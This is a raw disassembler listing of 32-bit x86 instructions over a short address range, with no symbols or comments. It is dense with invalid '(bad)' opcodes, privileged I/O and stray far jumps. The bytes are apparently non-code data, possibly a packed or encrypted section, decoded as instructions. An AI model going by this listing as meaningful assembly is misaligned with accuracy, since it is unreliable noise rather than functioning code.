  41f85b:	fmulp  st(7),st
  41f85d:	(bad)  
  41f85f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f860:	or     eax,0x88145f13
  41f865:	add    bl,BYTE PTR [edx-0x64]
  41f868:	out    0xa9,al
  41f86a:	shl    ecx,cl
  41f86c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f86d:	pop    edi
  41f86e:	pop    ds
  41f86f:	(bad)  
  41f870:	xchg   esi,eax
  41f871:	mov    al,ds:0xc6d36588
  41f876:	xor    bh,al
  41f878:	push   ebp
  41f879:	jne    0x41f810
  41f87b:	pop    esp
  41f87c:	add    bl,bh
  41f87e:	fcom   QWORD PTR [edi]
  41f880:	mov    WORD PTR [edi+0x7c],ds
  41f883:	sub    DWORD PTR [esp+edx*8],ebx
  41f886:	sar    BYTE PTR [edi-0x4c],cl
  41f889:	pop    edx
  41f88a:	xchg   edx,eax
  41f88b:	mov    ebx,0xb5420f8a
  41f890:	mov    bl,0x20
  41f892:	mov    esi,fs
  41f894:	stos   DWORD PTR es:[edi],eax
  41f895:	sub    al,0x78
  41f897:	add    eax,0xa73aa066
  41f89c:	in     al,dx
  41f89d:	push   esi
  41f89e:	retf   
  41f89f:	sub    esi,DWORD PTR ds:0xce0707a8
  41f8a5:	mov    esi,0xaf9cd4dc
  41f8aa:	sbb    esp,DWORD PTR [ebp+0x5c]
  41f8ad:	jo     0x41f905
  41f8af:	stos   DWORD PTR es:[edi],eax
  41f8b0:	daa    
  41f8b1:	call   0x6f11:0x4c83959f
  41f8b8:	mov    eax,0x57437177
  41f8bd:	pop    edx
  41f8be:	mov    dh,0x24
  41f8c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8c1:	dec    eax
  41f8c2:	rep lods eax,DWORD PTR ds:[esi]
  41f8c4:	xchg   edx,eax
  41f8c5:	(bad)  [ecx+ebx*8]
  41f8c8:	dec    eax
  41f8c9:	adc    eax,0x5f9ca63a
  41f8ce:	xchg   ecx,eax
  41f8cf:	jno    0x41f886
  41f8d1:	jno    0x41f869
  41f8d3:	mov    ebp,0x923cdc4e
  41f8d8:	pushf  
  41f8d9:	xor    ah,BYTE PTR [edi-0xc]
  41f8dc:	mov    ds:0xee399162,al
  41f8e1:	test   BYTE PTR [ebp+ecx*4+0xe],cl
  41f8e5:	cmp    eax,0x6744bc94
  41f8ea:	call   DWORD PTR [ebx-0x4edcc516]
  41f8f0:	aaa    
  41f8f1:	inc    ebx
  41f8f2:	inc    ebx
  41f8f3:	inc    ebp
  41f8f4:	out    dx,eax
  41f8f5:	xchg   esp,eax
  41f8f6:	enter  0x9811,0xf
  41f8fa:	push   ebp
  41f8fb:	fisttp QWORD PTR [ecx-0x615ec123]
  41f901:	or     ch,BYTE PTR [esi+0x111497a7]
  41f907:	jbe    0x41f935
  41f909:	inc    ecx
  41f90a:	or     edx,edi
  41f90c:	into   
  41f90d:	dec    ecx
  41f90e:	push   ebx
  41f90f:	(bad)  
  41f910:	add    DWORD PTR [eax-0x27],0xad087947
  41f917:	cli    
  41f918:	iret   
  41f919:	mov    ebx,0x550a43bf
  41f91e:	xor    DWORD PTR [esp+edi*8-0x76f486f8],ebx
  41f925:	adc    bh,BYTE PTR [ecx-0x770fdcb5]
  41f92b:	mov    eax,ds:0x949e07a0
  41f930:	sbb    eax,0x9976be7e
  41f935:	push   ecx
  41f936:	jmp    0x58d6f4a
  41f93b:	push   0xffffffcf
  41f93d:	ret    
  41f93e:	mov    edi,0xe15b1123
  41f943:	ror    BYTE PTR [ebx-0x79465cc6],1
  41f949:	xor    BYTE PTR cs:[edi+0x411f2be4],ah
  41f950:	fld    QWORD PTR [edi+0x7f31279b]
  41f956:	rol    eax,cl
  41f958:	daa    
  41f959:	pop    es
  41f95a:	cmp    al,BYTE PTR ds:0xed29aeb0
  41f960:	sbb    esi,DWORD PTR [edi+0x3a]
  41f963:	dec    esp
  41f964:	push   cs
  41f965:	int    0xa
  41f967:	inc    ecx
  41f968:	popf   
  41f969:	repz and eax,0x87fa1dd5
  41f96f:	dec    edx
  41f970:	dec    eax
  41f971:	add    eax,0xfa825e7a
  41f976:	sub    ebp,0xffffff86
  41f979:	lock pop esp
  41f97b:	xor    eax,0x7df1ec9c
  41f980:	jno    0x41f9b2
  41f982:	xor    BYTE PTR [ecx+ebx*4+0x8878b78],dl
  41f989:	ins    BYTE PTR es:[edi],dx
  41f98a:	fldenv [esi]
  41f98c:	lds    eax,FWORD PTR es:[ebx+0x63]
  41f990:	scas   eax,DWORD PTR es:[edi]
  41f991:	mov    edx,0x1513f13
  41f996:	popa   
  41f997:	adc    esp,DWORD PTR [ecx+0x45]
  41f99a:	adc    ebx,ebx
  41f99c:	test   BYTE PTR fs:[esi+0x6b340170],dh
  41f9a3:	sbb    DWORD PTR [edi],eax
  41f9a5:	js     0x41f995
  41f9a7:	push   edi
  41f9a8:	add    eax,0xef35f547
  41f9ad:	cmc    
  41f9ae:	and    al,0xd3
  41f9b0:	or     eax,0xde78b928
  41f9b5:	or     cl,bl
  41f9b7:	call   0x5e47:0xdced19b3
  41f9be:	mov    eax,0xaef5cd88
  41f9c3:	sti    
  41f9c4:	pop    eax
  41f9c5:	dec    edx
  41f9c6:	imul   ecx,DWORD PTR [edx+edi*1],0x56
  41f9ca:	pop    eax
  41f9cb:	or     BYTE PTR [eax+ecx*4],ch
  41f9ce:	into   
  41f9cf:	adc    DWORD PTR [ebp+eax*8+0x6e607350],0xffffffb7
  41f9d7:	clc    
  41f9d8:	mov    al,ds:0x18c0558f
  41f9dd:	jmp    0x41f9e1
  41f9df:	ds inc esi
  41f9e1:	fbld   TBYTE PTR [ecx]
  41f9e3:	out    dx,eax
  41f9e4:	cmp    eax,0x935a18d7
  41f9e9:	aam    0x61
  41f9eb:	daa    
  41f9ec:	jb     0x41f9ff
  41f9ee:	pushf  
  41f9ef:	(bad)  
  41f9f0:	(bad)  
  41f9f1:	or     al,0xc6
  41f9f3:	ins    DWORD PTR es:[edi],dx
  41f9f4:	test   esi,esp
  41f9f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9f7:	inc    eax
  41f9f8:	ins    BYTE PTR es:[edi],dx
  41f9f9:	add    esp,DWORD PTR [edx+0x7a]
  41f9fc:	pop    ecx
  41f9fd:	xchg   esp,eax
  41f9fe:	pushf  
  41f9ff:	jle    0x41fa76
  41fa01:	push   edx
  41fa02:	int    0xd9
  41fa04:	pop    esp
  41fa05:	push   ebx
  41fa06:	add    eax,0xae2d7cfd
  41fa0b:	dec    esp
  41fa0c:	pop    esp
  41fa0d:	push   ebp
  41fa0e:	aam    0xf8
  41fa10:	cmp    ebp,esp
  41fa12:	or     ebp,edi
  41fa14:	xor    ch,dl
  41fa16:	and    DWORD PTR [edx+0x5ecd7d31],ebp
  41fa1c:	arpl   sp,sp
  41fa1e:	mov    esp,0x467f2986
  41fa23:	fnsave [eax+0x24]
  41fa26:	sub    esi,ebx
  41fa28:	add    ebp,DWORD PTR [eax+0x45]
  41fa2b:	push   ebx
  41fa2c:	push   edx
  41fa2d:	mov    bl,0x34
  41fa2f:	sti    
  41fa30:	sub    al,0x69
  41fa32:	pop    ebp
  41fa33:	clc    
  41fa34:	(bad)  
  41fa35:	clc    
  41fa36:	mov    ch,0x23
  41fa38:	cld    
  41fa39:	call   0xb7fa19d9
  41fa3e:	dec    edx
  41fa3f:	(bad)  [ebp-0x6a113997]
  41fa45:	hlt    
  41fa46:	in     al,dx
  41fa47:	loopne 0x41fa32
  41fa49:	bound  edx,QWORD PTR [ebx+0x29]
  41fa4c:	in     al,dx
  41fa4d:	xlat   BYTE PTR ds:[ebx]
  41fa4e:	add    DWORD PTR [esi+0x4],edi
  41fa51:	pop    ebp
  41fa52:	dec    esp
  41fa53:	(bad)  
  41fa54:	mov    ebp,0xb1113d78
  41fa59:	call   0x958f5d42
  41fa5e:	pop    ecx
  41fa5f:	shl    BYTE PTR [ecx],0x23
  41fa62:	push   esi
  41fa63:	add    al,BYTE PTR [edx+ebx*8+0x79b3a1d7]
  41fa6a:	dec    ecx
  41fa6b:	mov    bh,0x18
  41fa6d:	pop    eax
  41fa6e:	inc    ebx
  41fa6f:	retf   0xbaad
  41fa72:	not    al
  41fa74:	inc    eax
  41fa75:	popf   
  41fa76:	call   DWORD PTR [esi]
  41fa78:	adc    BYTE PTR [eax+0x5],bh
  41fa7b:	(bad)
  41fa7e:	nop
  41fa7f:	dec    edi
  41fa80:	repnz cwde 
  41fa82:	scas   al,BYTE PTR es:[edi]
  41fa83:	cdq    
  41fa84:	test   eax,0x355e9290
  41fa89:	inc    edx
  41fa8a:	(bad)  
  41fa8b:	fbld   TBYTE PTR [ebx+0x2e]
  41fa8e:	push   esi
  41fa8f:	je     0x41fa55
  41fa91:	adc    bh,ah
  41fa93:	mov    al,ds:0xd573539e
  41fa98:	aad    0x3b
  41fa9a:	sub    esp,DWORD PTR [eax]
  41fa9c:	pop    esi
  41fa9d:	(bad)  
  41fa9f:	jle    0x41fa49
  41faa1:	jp     0x41fa9e
  41faa3:	xor    eax,0x6f1e01d9
  41faa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41faa9:	imul   ebp,DWORD PTR [ebx],0xffffffcc
  41faac:	adc    ebx,DWORD PTR [eax-0x75]
  41faaf:	and    BYTE PTR [edi],dl
  41fab1:	add    BYTE PTR [ebx-0x19],bh
  41fab4:	imul   ecx,DWORD PTR [ecx-0x36],0xffffffa4
  41fab8:	addr16 enter 0xb114,0x96
  41fabd:	inc    BYTE PTR [edi-0x3b]
  41fac0:	jno    0x41fab4
  41fac2:	mov    BYTE PTR [eax-0x1b66a0a5],cl
  41fac8:	inc    eax
  41fac9:	repz rcr BYTE PTR [eax+0x1a],0x28
  41face:	lahf   
  41facf:	dec    edx
  41fad0:	jp     0x41fb3e
  41fad2:	rcl    DWORD PTR [esi-0x3],1
  41fad5:	call   FWORD PTR [ecx-0x75b8f95e]
  41fadb:	mov    al,ds:0x7e1d48fb
  41fae0:	scas   eax,DWORD PTR es:[edi]
  41fae1:	lock and al,0x7e
  41fae4:	ins    BYTE PTR es:[edi],dx
  41fae5:	shr    BYTE PTR cs:[eax-0x244493cc],1
  41faec:	aaa    
  41faed:	mov    es,WORD PTR [edx-0x576a4c27]
  41faf3:	mov    bh,BYTE PTR [ecx+edx*2]
  41faf6:	mov    eax,0x5c60a328
  41fafb:	popf   
  41fafc:	stos   DWORD PTR es:[edi],eax
  41fafd:	xchg   ebp,eax
  41fafe:	leave  
  41faff:	cli    
  41fb00:	test   al,0x3f
  41fb02:	jae    0x41fb3e
  41fb04:	push   0xd70cd8e3
  41fb09:	adc    ebx,DWORD PTR [edx]
  41fb0b:	mov    al,ds:0x8241f456
  41fb10:	sub    ebp,edx
  41fb12:	lock int3 
  41fb14:	mov    ds:0xa9478f48,eax
  41fb19:	into   
  41fb1a:	jne    0x41fb81
  41fb1c:	mov    esp,0xd467f9d
  41fb21:	out    dx,al
  41fb22:	xchg   BYTE PTR ds:0x217f4408,ch
  41fb28:	xor    ecx,DWORD PTR [ecx-0x7239fd0a]
  41fb2e:	sbb    eax,0x783dfba3
  41fb33:	cli    
  41fb34:	push   ebx
  41fb35:	jl     0x41fb63
  41fb37:	fiadd  DWORD PTR [eax+0x1b]
  41fb3a:	sar    DWORD PTR ds:0x15201a80,cl
  41fb40:	lds    edi,FWORD PTR [ebp+0x72]
  41fb43:	sub    DWORD PTR [ebp-0x4f],0xffffff88
  41fb47:	inc    edx
  41fb48:	aad    0x68
  41fb4a:	sbb    BYTE PTR [esi-0x2e],dh
  41fb4d:	repnz sub eax,0x57640414
  41fb53:	pop    esi
  41fb54:	dec    esi
  41fb55:	push   0xffffffe1
  41fb57:	aas    
  41fb58:	jno    0x41fb95
  41fb5a:	retf   0xf6a4
  41fb5d:	inc    ebx
  41fb5e:	pop    esp
  41fb5f:	leave  
  41fb60:	(bad)  
  41fb61:	mov    ecx,0x26f168a
  41fb66:	out    0x16,al
  41fb68:	inc    esp
  41fb69:	int3   
  41fb6a:	cmp    BYTE PTR [esi-0x60],bh
  41fb6d:	and    eax,0x7c38493e
  41fb72:	rol    al,cl
  41fb74:	idiv   BYTE PTR [ebx+0x1b414860]
  41fb7a:	lods   al,BYTE PTR ds:[esi]
  41fb7b:	pop    es
  41fb7c:	mov    es,WORD PTR [edx-0x633d8dff]
  41fb82:	or     ch,ch
  41fb84:	outs   dx,DWORD PTR ds:[esi]
  41fb85:	retf   0xc1d2
  41fb88:	jmp    0x72ab9ba7
  41fb8d:	pop    ss
  41fb8e:	inc    eax
  41fb8f:	push   ss
  41fb90:	call   FWORD PTR [eax-0x2c81b1ea]
  41fb96:	cld    
  41fb97:	inc    ecx
  41fb98:	scas   al,BYTE PTR es:[edi]
  41fb99:	pop    edx
  41fb9a:	and    bl,BYTE PTR [edx+0x25]
  41fb9d:	(bad)  
  41fb9e:	out    dx,al
  41fb9f:	dec    eax
  41fba0:	push   esi
  41fba1:	pop    edx
  41fba2:	(bad)  
  41fba4:	or     al,0x2a
  41fba6:	adc    bl,BYTE PTR [edi+0xabea8f6]
  41fbac:	add    ebp,ebp
  41fbae:	add    DWORD PTR [eax+eax*2],esp
  41fbb1:	addr16 pop ss
  41fbb3:	mov    ch,dh
  41fbb5:	jno    0x41fc24
  41fbb7:	cwde   
  41fbb8:	sub    BYTE PTR [esp+edi*4+0x28],bh
  41fbbc:	or     ebp,edi
  41fbbe:	mov    ds:0xdd82e607,eax
  41fbc3:	arpl   WORD PTR [ebp+ebp*2+0x38],dx
  41fbc7:	test   eax,0xcafa4024
  41fbcc:	fisubr WORD PTR [edx]
  41fbce:	les    esi,FWORD PTR [edi-0x42]
  41fbd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbd2:	xlat   BYTE PTR ds:[ebx]
  41fbd3:	aas    
  41fbd4:	mov    ds:0xa43ef66e,eax
  41fbd9:	mov    ss,edx
  41fbdb:	je     0x41fc34
  41fbdd:	mov    esi,0x74491839
  41fbe2:	in     al,dx
  41fbe3:	cmc    
  41fbe4:	popf   
  41fbe5:	dec    edx
  41fbe6:	mul    BYTE PTR [edx]
  41fbe8:	outs   dx,BYTE PTR ds:[esi]
  41fbe9:	inc    esp
  41fbea:	dec    ebp
  41fbeb:	retf   
  41fbec:	in     eax,0x9e
  41fbee:	icebp  
  41fbef:	sbb    edi,edi
  41fbf1:	dec    ecx
  41fbf2:	daa    
  41fbf3:	out    0xdb,eax
  41fbf5:	fwait
  41fbf6:	sbb    eax,0xf5af6abf
  41fbfb:	inc    esi
  41fbfc:	(bad)  
  41fbfd:	ret    
  41fbfe:	xor    al,0x27
  41fc00:	cs fs cli 
  41fc03:	xchg   esp,eax
  41fc04:	ffree  st(7)
  41fc06:	add    eax,edi
  41fc08:	fstp   DWORD PTR [esi+0x46]
  41fc0b:	into   
  41fc0c:	test   DWORD PTR [edi+0x1859db9c],ecx
  41fc12:	xchg   edx,eax
  41fc13:	scas   al,BYTE PTR es:[edi]
  41fc14:	scas   al,BYTE PTR es:[edi]
  41fc15:	cld    
  41fc16:	jle    0x41fbe5
  41fc18:	mov    eax,ds:0x25ab653d
  41fc1d:	mov    dh,0xd0
  41fc1f:	or     ah,BYTE PTR [ecx]
  41fc21:	pop    edx
  41fc22:	retf   
  41fc23:	mov    ebp,0x93171839
  41fc28:	sahf   
  41fc29:	test   DWORD PTR [ebx-0x1b1a48e6],ebx
  41fc2f:	jno    0x41fbf9
  41fc31:	cmp    eax,0x6ca1e150
  41fc36:	ins    BYTE PTR es:[edi],dx
  41fc37:	daa    
  41fc38:	inc    esp
  41fc39:	jo     0x41fc08
  41fc3b:	push   ds
  41fc3c:	push   esp
  41fc3d:	sbb    eax,0x555a6317
  41fc42:	aam    0x68
  41fc44:	mov    eax,ds:0xf1b6a6fb
  41fc49:	push   edi
  41fc4a:	pop    ebp
  41fc4b:	xchg   edx,eax
  41fc4c:	xor    BYTE PTR [ebp+0x7c],ah
  41fc4f:	mov    dh,0x74
  41fc51:	(bad)  
  41fc52:	jg     0x41fbfc
  41fc54:	sbb    edi,DWORD PTR [ecx]
  41fc56:	xchg   esi,edi
  41fc58:	xor    eax,0xb45f52ed
  41fc5d:	add    eax,0x84a363e7
  41fc62:	cmp    edx,esp
  41fc64:	inc    esp
  41fc65:	stos   BYTE PTR es:[edi],al
  41fc66:	std    
  41fc67:	out    dx,al
  41fc68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc69:	mov    DWORD PTR [edx-0x46689e06],edx
  41fc6f:	sets   BYTE PTR [ebx-0x58]
  41fc73:	fs push edx
  41fc75:	push   0x95beed52
  41fc7a:	sahf   
  41fc7b:	ja     0x41fcaa
  41fc7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc7e:	icebp  
  41fc7f:	push   ss
  41fc80:	shl    ebp,cl
  41fc82:	sub    DWORD PTR [ebx+eax*1],0xffffffa5
  41fc86:	jp     0x41fc46
  41fc88:	xchg   esi,eax
  41fc89:	sub    DWORD PTR [edi-0x17],ecx
  41fc8c:	mov    al,ds:0xd483ac97
  41fc91:	shl    DWORD PTR [edx+0x1255de94],1
  41fc97:	fbstp  TBYTE PTR [eax]
  41fc99:	mov    al,0x42
  41fc9b:	pop    es
  41fc9c:	and    eax,0x3e32edff
  41fca1:	lock inc ebp
  41fca3:	dec    edx
  41fca4:	std    
  41fca5:	sbb    cl,ch
  41fca7:	mov    esp,0x36eb6ee7
  41fcac:	stc    
  41fcad:	add    BYTE PTR [ebx+0x6],ch
  41fcb0:	mov    al,0x9d
  41fcb2:	adc    bl,bl
  41fcb4:	popa   
  41fcb5:	push   ebp
  41fcb6:	ja     0x41fd18
  41fcb8:	push   ds
  41fcb9:	inc    edi
  41fcba:	fcmovnbe st,st(7)
  41fcbc:	dec    edx
  41fcbd:	add    edx,DWORD PTR ds:0xb275d17f
  41fcc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcc4:	xchg   edx,eax
  41fcc5:	xchg   ebx,eax
  41fcc6:	sub    al,0x6c
  41fcc8:	das    
  41fcc9:	fbstp  TBYTE PTR [edx+ecx*4-0x57]
  41fccd:	sbb    BYTE PTR [esi+0x18578ed8],ah
  41fcd3:	jge    0x41fd25
  41fcd5:	or     al,0x53
  41fcd7:	xlat   BYTE PTR ds:[ebx]
  41fcd8:	pusha  
  41fcd9:	test   al,0x6d
  41fcdb:	shr    ebx,0xd5
  41fcde:	jbe    0x41fca4
  41fce0:	xor    edi,edi
  41fce2:	(bad)  
  41fce3:	or     eax,0x1e926706
  41fce8:	clc    
  41fce9:	inc    esp
  41fcea:	mov    esi,edi
  41fcec:	pop    ds
  41fced:	push   esp
  41fcee:	fs push ss
  41fcf0:	and    ebx,DWORD PTR [esp+eiz*8]
  41fcf3:	inc    edi
  41fcf4:	out    0xdb,eax
  41fcf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcf7:	(bad)  
  41fcf9:	das    
  41fcfa:	call   0xbd2b93ae
  41fcff:	jmp    0xe7d8:0xebd34e9c
  41fd06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd07:	xchg   DWORD PTR [ebp-0x26],ebp
  41fd0a:	push   esi
  41fd0b:	mov    bl,BYTE PTR [esi+0x17]
  41fd0e:	xor    BYTE PTR [eax-0x51b778e1],dl
  41fd14:	xor    al,0x31
  41fd16:	stc    
  41fd17:	or     cl,BYTE PTR [ebp+0x6c]
  41fd1a:	mov    cl,0xb
  41fd1c:	stos   BYTE PTR es:[edi],al
  41fd1d:	js     0x41fd18
  41fd1f:	or     ah,BYTE PTR [ecx-0x6f]
  41fd22:	popa   
  41fd23:	inc    ecx
  41fd24:	retf   
  41fd25:	out    dx,al
  41fd26:	mov    bh,0xb9
  41fd28:	loopne 0x41fcb6
  41fd2a:	pop    ds
  41fd2b:	push   esp
  41fd2c:	xchg   ebp,eax
  41fd2d:	stos   BYTE PTR es:[edi],al
  41fd2e:	jae    0x41fccb
  41fd30:	xor    esp,DWORD PTR [eax+0x13616989]
  41fd36:	cmp    DWORD PTR [edx],ebp
  41fd38:	pop    edx
  41fd39:	adc    al,cl
  41fd3b:	push   0xffffffc1
  41fd3d:	in     eax,0x18
  41fd3f:	jp     0x41fd92
  41fd41:	mov    edi,0xbf0d4705
  41fd46:	jge    0x41fd9e
  41fd48:	retf   
  41fd49:	mov    ebx,0x19dc7a49
  41fd4e:	out    0xa2,al
  41fd50:	imul   ebx,DWORD PTR [edi-0x4c42fff0],0x74
  41fd57:	xor    al,0xa0
  41fd59:	arpl   WORD PTR ds:0xd829a991,bp
  41fd5f:	js     0x41fdb9
  41fd61:	mov    cl,0x4c
  41fd63:	cmp    BYTE PTR [ecx-0x43],ch
  41fd66:	mov    al,ds:0xb9bf0c95
  41fd6b:	dec    eax
  41fd6c:	push   ecx
  41fd6d:	cmp    edi,DWORD PTR [ebx]
  41fd6f:	mov    cs:0xffb20513,al
  41fd75:	in     eax,dx
  41fd76:	ror    BYTE PTR [ecx-0x1d],0xaf
  41fd7a:	into   
  41fd7b:	push   esi
  41fd7c:	or     DWORD PTR [edi+esi*4-0x816286f],esp
  41fd83:	aam    0x5e
  41fd85:	jnp    0x41fd1c
  41fd87:	xor    BYTE PTR [eax+0x11],bl
  41fd8a:	cmp    BYTE PTR es:[eax],0xde
  41fd8e:	int    0xd2
  41fd90:	mov    DWORD PTR [esi+0x3d],esi
  41fd93:	lods   al,BYTE PTR ds:[esi]
  41fd94:	dec    ecx
  41fd95:	pop    edx
  41fd96:	hlt    
  41fd97:	push   ds
  41fd98:	aas    
  41fd99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd9a:	les    ebx,FWORD PTR ds:0x96de1c4e
  41fda0:	xor    bl,bh
  41fda2:	adc    al,0x55
  41fda4:	mov    bh,0xb6
  41fda6:	stc    
  41fda7:	dec    esi
  41fda8:	aaa    
  41fda9:	xor    ebp,DWORD PTR [ebx]
  41fdab:	push   ebp
  41fdac:	ss std 
  41fdae:	sub    eax,0x53747aa0
  41fdb3:	and    BYTE PTR gs:[ebp-0xe],al
  41fdb7:	pop    ecx
  41fdb8:	push   ebx
  41fdb9:	fstp   st(6)
  41fdbb:	and    eax,0x19ba7b3b
  41fdc0:	inc    edi
  41fdc1:	(bad)  
  41fdc3:	scas   al,BYTE PTR es:[edi]
  41fdc4:	xchg   edx,eax
  41fdc5:	stc    
  41fdc6:	sbb    DWORD PTR [edi-0x53965d52],edi
  41fdcc:	xchg   ebp,eax
  41fdcd:	mov    ebx,0xc1fc3b8b
  41fdd2:	pop    ecx
  41fdd3:	aam    0x3e
  41fdd5:	pop    ebx
  41fdd6:	xchg   BYTE PTR [edx],cl
  41fdd8:	and    DWORD PTR [ecx-0x24065a88],esi
  41fdde:	xor    DWORD PTR [eax],edi
  41fde0:	inc    esi
  41fde1:	jp     0x41fe1d
  41fde3:	cdq    
  41fde4:	push   0xffffff86
  41fde6:	dec    ecx
  41fde7:	repnz ficom DWORD PTR [edi+0x5741b61a]
  41fdee:	xor    al,dh
  41fdf0:	mov    al,cs:0x4d824c94
  41fdf6:	push   0xffffff8e
  41fdf8:	inc    ecx
  41fdf9:	data16 jp 0x41fdb5
  41fdfc:	mov    bl,BYTE PTR [eax]
  41fdfe:	inc    edi
  41fdff:	fld    st(6)
  41fe01:	adc    al,0xaa
  41fe03:	sub    edi,DWORD PTR [edi+0x55]
  41fe06:	or     eax,0xc5cf472b
  41fe0b:	mov    dh,0x8
  41fe0d:	pop    eax
  41fe0e:	shl    DWORD PTR [edx-0x13],0x75
  41fe12:	mov    esi,0x81aa6490
  41fe17:	ja     0x41fd9d
  41fe19:	neg    DWORD PTR [edi+0x7bad0df3]
  41fe1f:	ret    0xa45e
  41fe22:	lods   al,BYTE PTR ds:[esi]
  41fe23:	pop    ds
  41fe24:	jns    0x41fdc6
  41fe26:	(bad)  
  41fe27:	mov    dl,0x55
  41fe29:	inc    eax
  41fe2a:	jbe    0x41fe72
  41fe2c:	adc    cl,dl
  41fe2e:	(bad)  
  41fe2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe30:	push   esi
  41fe31:	sub    ch,cl
  41fe33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe34:	xor    ecx,esp
  41fe36:	sub    al,0xb8
  41fe38:	cs mov ecx,0x53b5f585
  41fe3e:	imul   edx,DWORD PTR [edi+0x52],0xffffffaf
  41fe42:	fdiv   st(6),st
  41fe44:	aad    0xf8
  41fe46:	pop    esp
  41fe47:	rcl    BYTE PTR [ebp+ebx*4+0x67],1
  41fe4b:	mov    ebp,0x275684fb
  41fe50:	stos   DWORD PTR es:[edi],eax
  41fe51:	xor    eax,0x6b5ac0d0
  41fe56:	mov    edx,0xb9a75a1d
  41fe5b:	arpl   WORD PTR [ecx+eax*4+0x75a99515],bx
  41fe62:	add    eax,0x66a6d2d2
  41fe67:	sub    bl,BYTE PTR [ebp-0x2a859a9a]
  41fe6d:	xor    bh,BYTE PTR [esi-0x182dae4a]
  41fe73:	scas   eax,DWORD PTR es:[edi]
  41fe74:	sub    ecx,DWORD PTR [ebp+ebx*8-0x63]
  41fe78:	leave  
  41fe79:	add    DWORD PTR [esi+ecx*2-0x23],ebx
  41fe7d:	sbb    ecx,DWORD PTR [edi-0x2c8f51ca]
  41fe83:	add    al,0x56
  41fe85:	jnp    0x41fe0d
  41fe87:	xor    DWORD PTR [edi+ecx*4],esp
  41fe8a:	aam    0x4d
  41fe8c:	sub    DWORD PTR [ebx-0x2e],0x90588472
  41fe93:	or     eax,0x1d149cc4
  41fe98:	xor    ah,0xa2
  41fe9b:	inc    ebx
  41fe9c:	bound  ebx,QWORD PTR [eax]
  41fe9e:	xchg   ecx,eax
  41fe9f:	add    BYTE PTR [edx],cl
  41fea1:	push   esp
  41fea2:	out    dx,al
  41fea3:	mov    dh,BYTE PTR [ecx]
  41fea5:	mov    esi,DWORD PTR [esi]
  41fea7:	mov    edi,edx
  41fea9:	mov    bh,0x91
  41feab:	dec    edx
  41feac:	push   cs
  41fead:	pusha  
  41feae:	xlat   BYTE PTR ds:[ebx]
  41feaf:	into   
  41feb0:	mov    esi,0x8d109b50
  41feb5:	ficomp DWORD PTR [eax-0x2a]
  41feb8:	lds    edx,FWORD PTR [ebx]
  41feba:	or     al,0x4c
  41febc:	shl    DWORD PTR [esi+0x62925568],0x85
  41fec3:	jmp    0x9c36:0x9185c7ec
  41feca:	sahf   
  41fecb:	sub    BYTE PTR [edi+0x7a],al
  41fece:	and    dh,BYTE PTR [edx]
  41fed0:	test   DWORD PTR [eax],eax
  41fed2:	cmp    BYTE PTR [ebx*8-0x62b134db],ah
  41fed9:	xchg   BYTE PTR [ecx-0xba270fc],ch
  41fedf:	push   ebx
  41fee0:	fs jle 0x41fef5
  41fee3:	cmp    eax,DWORD PTR [esi-0x5a]
  41fee6:	scas   eax,DWORD PTR es:[edi]
  41fee7:	xor    dl,BYTE PTR [ebx+0x31]
  41feea:	sub    al,0xc7
  41feec:	mov    eax,ds:0x354532d2
  41fef1:	(bad)  
  41fef2:	retf   
  41fef3:	loop   0x41fe94
  41fef5:	ret    
  41fef6:	jge    0x41ff49
  41fef8:	lock out 0x81,eax
  41fefb:	loope  0x41fefc
  41fefd:	sbb    BYTE PTR [eax+ecx*1],bh
  41ff00:	mov    ds:0xe8ebab7d,al
  41ff05:	aam    0x56
  41ff07:	or     edx,0xffffff94
  41ff0a:	aad    0x6
  41ff0c:	jae    0x41fefc
  41ff0e:	sub    al,0x84
  41ff10:	ins    BYTE PTR es:[edi],dx
  41ff11:	loop   0x41ff50
  41ff13:	mov    ecx,0x7e227077
  41ff18:	xchg   BYTE PTR [eax],ch
  41ff1a:	repz inc eax
  41ff1c:	enter  0xc1c2,0x5b
  41ff20:	mov    eax,ds:0x2e05807f
  41ff25:	cmp    esi,DWORD PTR [edx-0x4b]
  41ff28:	mov    al,ds:0x846ca648
  41ff2d:	mov    ?,WORD PTR [edi-0x3875c717]
  41ff33:	sbb    eax,DWORD PTR [eax-0x26]
  41ff36:	mov    WORD PTR [edx-0x20],fs
  41ff39:	shr    BYTE PTR [eax],1
  41ff3b:	cwde   
  41ff3c:	dec    BYTE PTR [eax]
  41ff3e:	xor    DWORD PTR [esi+0x6b],0x49
  41ff42:	or     DWORD PTR [eax],ebx
  41ff44:	sbb    DWORD PTR cs:[esi],edx
  41ff47:	lods   al,BYTE PTR ds:[esi]
  41ff48:	mov    ds:0xb1e162e9,eax
  41ff4d:	retf   0xc827
  41ff50:	bound  ecx,QWORD PTR [ebx-0x51]
  41ff53:	imul   esi,DWORD PTR [esi-0x6f],0x54230e29
  41ff5a:	jecxz  0x41ff27
  41ff5c:	and    al,al
  41ff5e:	in     al,dx
  41ff5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff60:	or     ah,BYTE PTR [edi+0x6c2e46fc]
  41ff66:	xchg   esp,eax
  41ff67:	and    dh,BYTE PTR [edi-0x4d]
  41ff6a:	mov    esp,ds
  41ff6c:	fmul   QWORD PTR [esi-0x2213bd8]
  41ff72:	push   edi
  41ff73:	jno    0x41ffcc
  41ff75:	fidivr DWORD PTR [ebx-0x78]
  41ff78:	(bad)  
  41ff7a:	sbb    al,0x88
  41ff7c:	sub    eax,0x9baf9b16
  41ff81:	sbb    esp,eax
  41ff83:	sar    BYTE PTR [eax+0x5146c470],0xf6
  41ff8a:	(bad)  
  41ff8b:	mov    ecx,0xa507d3a8
  41ff90:	cld    
  41ff91:	dec    eax
  41ff92:	jns    0x41ffab
